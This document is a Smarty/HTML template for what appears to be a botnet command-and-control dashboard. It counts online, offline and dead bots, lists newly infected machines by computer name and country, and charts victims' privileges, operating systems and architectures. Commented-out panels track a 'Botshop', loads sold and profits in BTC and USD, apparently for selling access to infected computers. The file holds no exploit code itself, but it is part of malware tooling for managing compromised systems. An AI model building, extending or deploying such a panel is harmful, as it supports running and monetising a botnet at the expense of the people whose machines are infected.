{include file="header.tpl"}
{include file="nav.tpl"}

<div class="page-header">
    <div class="container-fluid">
        <h2 class="h5 no-margin-bottom">Dashboard</h2>
    </div>
</div>
<!--
Botshop Transactions(all)
Loads sold (all)
Botshop Proift btc $
wait a bit

-->
<section class="no-padding-top no-padding-bottom">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-user-1"></i></div>
                            <strong>Online Clients</strong>
                        </div>
                        <div class="number dashtext-1">{$onlinebotcount}</div>
                    </div>

                    <div class="progress progress-template">
                        <div role="progressbar" id="dashbg-1" style="width: 30%" aria-valuenow="30" aria-valuemin="0"
                             aria-valuemax="100" class="progress-bar progress-bar-template "></div>
                    </div>

                </div>
            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-contract"></i></div>
                            <strong>Offline Clients</strong>
                        </div>
                        <div class="number dashtext-2">{$botcount - $onlinebotcount}</div>
                    </div>

                    <div class="progress progress-template">
                        <div role="progressbar" id="dashbg-2" style="width: 70%" aria-valuenow="70" aria-valuemin="0"
                             aria-valuemax="100" class="progress-bar progress-bar-template "></div>
                    </div>

                </div>
            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-paper-and-pencil"></i></div>
                            <strong>Dead Clients</strong>
                        </div>
                        <div class="number dashtext-3">{$deadbotcount}</div>
                    </div>

                    <div class="progress progress-template">
                        <div role="progressbar" style="width: 55%" id="dashbg-3" aria-valuenow="55" aria-valuemin="0"
                             aria-valuemax="100" class="progress-bar progress-bar-template "></div>
                    </div>

                </div>
            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-writing-whiteboard"></i></div>
                            <strong>Total Clients</strong>
                        </div>
                        <div class="number dashtext-4">{$botcount}</div>
                    </div>

                    <div class="progress progress-template">
                        <div role="progressbar" style="width: 35%" id="dashbg-4" aria-valuenow="35" aria-valuemin="0"
                             aria-valuemax="100" class="progress-bar progress-bar-template "></div>
                    </div>

                </div>
            </div>
            <!--   <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-writing-whiteboard"></i></div><strong>Botshop Transactions</strong>
                        </div>
                        <div class="number dashtext-4">{$botcount}</div>
                    </div>
                                </div>

                            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-writing-whiteboard"></i></div><strong>Total Loads Sold</strong>
                        </div>
                        <div class="number dashtext-4">{$botcount}</div>
                    </div>
                </div>
            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-writing-whiteboard"></i></div><strong>Botshop Profit In BTC</strong>
                        </div>
                        <div class="number dashtext-4">20</div>
                    </div>
                </div>

            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-writing-whiteboard"></i></div><strong>Botshop Profit In USD</strong>
                        </div>
                        <div class="number dashtext-4">$24.875</div>
                    </div>
                </div>
            </div> -->
        </div>

        <div class="row">
            <div class="col-lg-9 col-md-12 col-sm-12">
                <div id="vmap" style=""></div>
            </div>
            <div class="col-lg-3 col-md-12 col-sm-12">
                <div class="row">
                    <div class="col-lg-12 col-md-6 col-sm-12">
                        <div class="stats-with-chart-1 block">
                            <div class="title"><strong class="d-block"> Privileges</strong><span class="d-block">Privilegs from Clients</span>
                            </div>
                            <div class="row d-flex align-items-top justify-content-between">
                                <div class="col-12">
                                    <div class="bar-chart chart">
                                        <div class="chartjs-size-monitor"
                                             style="position: absolute; left: 0px; top: 0px; right: 0px; bottom: 0px; overflow: hidden; pointer-events: none; visibility: hidden; z-index: -1;">
                                            <div class="chartjs-size-monitor-expand"
                                                 style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
                                                <div style="position:absolute;width:1000000px;height:1000000px;left:0;top:0"></div>
                                            </div>
                                            <div class="chartjs-size-monitor-shrink"
                                                 style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
                                                <div style="position:absolute;width:200%;height:200%;left:0; top:0"></div>
                                            </div>
                                        </div>
                                        <canvas id="privilegesChart" width="297" height="148"
                                                class="chartjs-render-monitor"
                                                style="display: block; width: 297px; height: 148px;"></canvas>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>

                </div>


            </div>


        </div>

        <div class="row">
            <div class="col-lg-6 col-md-6 col-sm-12">
                <div class="stats-with-chart-1 block">
                    <div class="title"><strong class="d-block"> Latest Installs </strong><span class="d-block">These bots are the newest</span></div>
                    <div class="latestInstalls">
                        {foreach from=$last5Installs item=install}

                            <div class="install">
                                <div class="country">
                                    {if $install.country == "unknow"}
                                        <span>N/A</span>
                                    {else}
                                        <img src="{$includeDir}assets/img/flags/flags/{$install.country|lower}.png">
                                        <span>{$install.country}</span>
                                    {/if}
                                </div>
                                <div class="computername">
                                    {$install.computrername}
                                </div>
                                <div class="installdate">
                                    <span id="lastSeen-{$install.id}"></span>
                                    <script>$("#lastSeen-{$install.id}").html(timeDifference("{$install.now}", "{$install.install_date}")) </script>
                                </div>
                            </div>
                        {/foreach}
                    </div>
                </div>
            </div>
            <div class="col-lg-6 col-md-6 col-sm-12">

                <div class="stats-with-chart-1 block">
                    <div class="title"><strong class="d-block"> Top Countries</strong><span class="d-block">The most bots are from:</span>
                    </div>
                    <div class="row d-flex align-items-top justify-content-between">
                        <div class="col-4">
                            <div class="text">

                                <span class="d-block">Bots Seen in last </span>
                                <small class="d-block">12 Hours: <strong>{$last12hclientscount}</strong></small>
                                <small class="d-block">24 Hours: <strong>{$lastclientscount}</strong></small>
                                <small class="d-block">7 Days: <strong>{$last7clientscount}</strong></small>

                            </div>
                        </div>
                        <div class="col-8">
                            <div class="bar-chart chart">
                                <div class="chartjs-size-monitor"
                                     style="position: absolute; left: 0px; top: 0px; right: 0px; bottom: 0px; overflow: hidden; pointer-events: none; visibility: hidden; z-index: -1;">
                                    <div class="chartjs-size-monitor-expand"
                                         style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
                                        <div style="position:absolute;width:1000000px;height:1000000px;left:0;top:0"></div>
                                    </div>
                                    <div class="chartjs-size-monitor-shrink"
                                         style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
                                        <div style="position:absolute;width:200%;height:200%;left:0; top:0"></div>
                                    </div>
                                </div>
                                <canvas id="visitPieChart" width="297" height="148" class="chartjs-render-monitor"
                                        style="display: block; width: 297px; height: 148px;"></canvas>

                            </div>
                        </div>
                    </div>
                </div>
            </div>



        </div>
        <br>
        <div class="row">
            <div class="col-lg-4 col-md-6 col-sm-12">

                <div class="stats-with-chart-1 block" style="height: 500px;">
                    <canvas id="osPiChart" width="200" height="150"></canvas>
                </div>

                <!--   <canvas id="architectureStatus" width="200" height="150"></canvas>  -->


            </div>
            <div class="col-lg-4 col-md-6 col-sm-12">

                <div class="stats-with-chart-1 block" style="height: 150px;">
                    <canvas id="architectureStatus" width="200" height="150"></canvas>
                </div>
                <!--   <canvas id="architectureStatus" width="200" height="150"></canvas>  -->


            </div>
            <div class="col-lg-4 col-md-6 col-sm-12">

                <div class="stats-with-chart-1 block" style="height: 500px;">
                    <canvas id="countryStatus2" width="200" height="150"></canvas>
                </div>
                <!--   <canvas id="architectureStatus" width="200" height="150"></canvas>  -->


            </div>
        </div>
    </div>
</section>

<script>


    function percentage(partialValue, totalValue, selector) {
        var percent = (100 * partialValue) / totalValue;

        $(selector).width(percent + "%");
    }

    percentage({$onlinebotcount},{$botcount}, "#dashbg-1");
    percentage({$botcount - $onlinebotcount},{$botcount}, "#dashbg-2");
    percentage({$deadbotcount},{$botcount}, "#dashbg-3");
    percentage({$botcount},{$botcount}, "#dashbg-4");

    $(document).ready(function () {








        "use strict";
        Chart.defaults.global.defaultFontColor = "#75787c";

        generateLineChart("privilegesChart",{$adminOrNotLables},{$adminOrNotValues});

        var ctx = $("#visitPieChart");
        new Chart(ctx, {
            type: "pie",
            options: {
                legend: {
                    display: !1
                }
            },
            data: {
                labels: {$countyLables},
                datasets: [{
                    data: {$countyValue},
                    borderWidth: 0,
                    backgroundColor: ["#723ac3", "#864DD9", "#9762e6", "#a678eb","#723ac3"],
                    hoverBackgroundColor: ["#723ac3", "#864DD9", "#9762e6", "#a678eb","#723ac3"]
                }]
            }
        });
    });


    $(document).ready(function () {
        generateWordMap({$worldmap}); // if you CLICK STRG and click on the function you load the file
        generateArchitectureStatusLineChart("architectureStatus",{$architectureLables},{$architectureValue});
        generateArchitectureStatusLineChart("countryStatus2",{$countyLables},{$countyValue});
        generateArchitectureStatusLineChart("osPiChart",{$top3osLables},{$top3osvalues});

    });

</script>

{include file="footer.tpl"}
<!--
<script src="{$includeDir}assets/js/charts-home.js"></script>
-->

